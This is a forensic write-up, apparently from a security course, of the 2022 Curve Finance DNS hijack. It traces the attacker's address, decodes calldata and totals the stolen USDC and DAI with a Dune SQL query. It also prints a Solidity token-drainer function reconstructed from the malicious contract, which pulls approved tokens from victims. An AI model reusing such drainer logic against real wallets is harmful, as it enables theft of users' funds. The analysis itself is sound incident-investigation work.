---
title: 'From DNS Hijacking to Stealing Over $600K'
description: 'A blockchain security investigation into the 2022 Curve Finance DNS hijacking attack, tracing the malicious approval flow and calculating the stolen funds.'
date: 2026-09-09
category: 'Blockchain Security'
tags:
  - Blockchain
cover: '/images/research/curve-finance-dns-hijacking/0.png'
toc: true
---

# From DNS Hijacking to Stealing Over $600K

## Note

This write-up is based on a task from [Forta’s Blockchain Security course](https://www.youtube.com/playlist?list=PLgAorDu9_-dPGPkVWFceDNjlHyvvrx8Y0). I highly recommend the course if you’re interested in blockchain security.

## Incident Overview

On August 9, 2022, **Curve Finance** suffered a DNS hijacking attack affecting its official domain, **curve.fi**. The attacker compromised the DNS configuration associated with Curve’s domain registrar, **iwantmyname**, and modified the DNS records to point the legitimate domain to an attacker-controlled server.

As a result, users who visited **curve.fi** were served a malicious clone of the Curve Finance frontend. Although the website appeared legitimate, malicious code had been injected into the page to trick users into approving an **attacker-controlled smart contract**. Once a victim approved the contract, the attacker could use that approval to transfer the victim’s tokens without requiring another confirmation.

We begin our investigation with the known attacker address:

```text
0x50f9202e0f1c1577822BD67193960B213CD2f331
```

After searching for the attacker’s address on Etherscan, we opened the ERC-20 Token Transfers tab to review its token activity. By checking the older transfers, we identified the following transactions:

![Attacker ERC-20 token transfers](/images/research/curve-finance-dns-hijacking/1.png)

The first transactions appear to be a test of the attack flow. The attacker sent 16.880678 USDC to `0x4547...`, and the same amount was later transferred back through the suspicious contract. This suggests that the attacker was testing whether the malicious transfer mechanism was working correctly.

> We will set these transactions aside for now and continue analyzing the subsequent activity.

## Malicious Approval Flow

> **Note:** The malicious website tricked users into approving the attacker’s contract while they believed they were performing a normal approval to use Curve. After this approval was granted, the attacker could use the malicious contract to transfer the victim’s tokens without asking for another approval.

When we open transaction `0x32faf49f...`, we can see that the attacker did not receive the funds through a direct transfer from the victim. Instead, the attacker interacted with the malicious contract `0x9Eb5...8881`, as shown in the transaction details and input data. This indicates that the contract was used to pull the victim’s tokens and transfer them to the attacker.

![Transaction details](/images/research/curve-finance-dns-hijacking/2.png)

![Malicious contract interaction](/images/research/curve-finance-dns-hijacking/3.png)

### Input Data

```text
0x9c307de6000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000986680f665eb6fb6f72c9df209468e3426517bc6
```

> If you have some knowledge of the EVM and ABI encoding, you can see that the calldata is divided into three parts: a 4-byte function selector followed by two 32-byte ABI-encoded parameters.

```solidity
// Reconstructed from the deployed bytecode
function function_9c307de6(
    address token,
    address target
) external {
    _drain(token, target);
}

function _drain(
    address token,
    address target
) internal {

    uint256 balance =
        IERC20(token).balanceOf(target);

    uint256 approved =
        IERC20(token).allowance(
            target,
            address(this)
        );

    if (balance > 0 && approved > 0) {

        uint256 amount =
            balance < approved
                ? balance
                : approved;

        IERC20(token).transferFrom(
            target,
            recipient,
            amount
        );
    }
}
```

The function takes two parameters:

```text
address token = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48
address target = 986680f665eb6fb6f72c9df209468e3426517bc6
```

The first parameter identifies which ERC-20 token the contract should interact with, while the second parameter identifies the wallet address from which the tokens will be transferred — the victim wallet.

The function checks the target wallet’s token balance and the allowance granted to the malicious contract. If both values are greater than zero, it transfers the smaller of the balance and the allowance. Since the victims granted an unlimited approval, the contract could effectively transfer the victim’s entire available token balance.

By checking the target wallet, we can confirm that the token-draining operation was successful and the USDC was transferred to the attacker address.

![Victim wallet token transfer](/images/research/curve-finance-dns-hijacking/4.png)

## Calculating the Total Amount Stolen

Our second objective is to calculate the total amount stolen. After testing several approaches, the most effective method was to use Dune Analytics, a web-based platform that allows us to query blockchain data using SQL and aggregate the relevant transactions.

```sql
WITH stolen AS (

    SELECT
        t.block_time,
        t.tx_hash,
        t."from" AS victim,
        t."to" AS attacker,
        t.symbol,
        t.contract_address,
        t.amount,
        t.amount_usd

    FROM tokens.transfers t

    INNER JOIN ethereum.transactions tx
        ON t.tx_hash = tx.hash

    WHERE t.blockchain = 'ethereum'

      AND t.block_date = DATE '2022-08-09'

      AND t."to" =
          0x50f9202e0f1c1577822BD67193960B213CD2f331

      AND tx."from" =
          0x50f9202e0f1c1577822BD67193960B213CD2f331

      AND tx."to" =
          0x9Eb5F8e83359Bb5013f3D8eee60bDCe5654e8881

      AND t.contract_address IN (
          0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48, -- USDC
          0x6B175474E89094C44Da98b954EedeAC495271d0F  -- DAI
      )
)

SELECT
    COUNT(DISTINCT tx_hash) AS number_of_transactions,
    COUNT(DISTINCT victim) AS number_of_victims,
    SUM(amount_usd) AS total_stolen_usd
FROM stolen;
```

![Dune Analytics stolen funds result](/images/research/curve-finance-dns-hijacking/5.png)

## Thanks for Reading

I recommend this course if you’re interested in blockchain security.
